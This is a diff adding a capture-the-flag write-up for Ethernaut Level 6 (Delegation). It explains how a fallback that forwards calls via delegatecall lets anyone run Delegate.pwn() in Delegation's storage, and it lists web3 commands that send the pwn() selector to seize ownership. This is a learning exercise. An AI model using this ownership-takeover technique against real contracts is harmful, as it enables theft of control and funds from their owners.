@@ -247,3 +247,63 @@ To verify that my token balance is now much larger than the original 20 tokens.
 
 ## Level completed
 ![Level Complete Output](assets/Token.png)
+
+
+
+# Ethernaut Level 6: Delegation
+
+## Strategy
+
+- **Vulnerability**: The `Delegation` contract has a `fallback()` function that uses `delegatecall` to forward all unknown calls to the `Delegate` contract. Since `delegatecall` runs in the context of the calling contract’s storage, executing the `pwn()` function from `Delegate` via `delegatecall` will modify `Delegation`'s `owner` instead.
+- **Exploit**: By sending a transaction directly to `Delegation` with the function selector for `pwn()`, we can trick the fallback into calling `Delegate.pwn()` and thus take over ownership.
+
+---
+
+## Commands Used
+
+### 1. Get the instance address
+```
+contract.address
+```
+To confirm the deployed contract's address.
+
+---
+
+### 2. Set the instance variable to contract address
+```
+let instance = "0xinstance_address";
+```
+To specify the instance we are attacking.
+
+---
+
+### 3. Get the player’s account
+```
+let player = (await web3.eth.getAccounts())[0];
+```
+To get the sender address (your player address).
+
+---
+
+### 4. Send the function selector of `pwn()` to the contract
+```
+await web3.eth.sendTransaction({
+  from: player,
+  to: instance,
+  data: "0xdd365b8b"
+});
+```
+`"0xdd365b8b"` is the function selector for `pwn()`. Sending this directly invokes the fallback in `Delegation`, which performs a delegatecall to `Delegate.pwn()`—setting `msg.sender` (player) as the new `owner`.
+
+---
+
+### 5. Check if ownership has changed
+```
+await contract.owner()
+```
+To verify that the `owner` is now the player.
+
+---
+
+## Level completed
+![Level Complete Output](assets/Delegation.png)
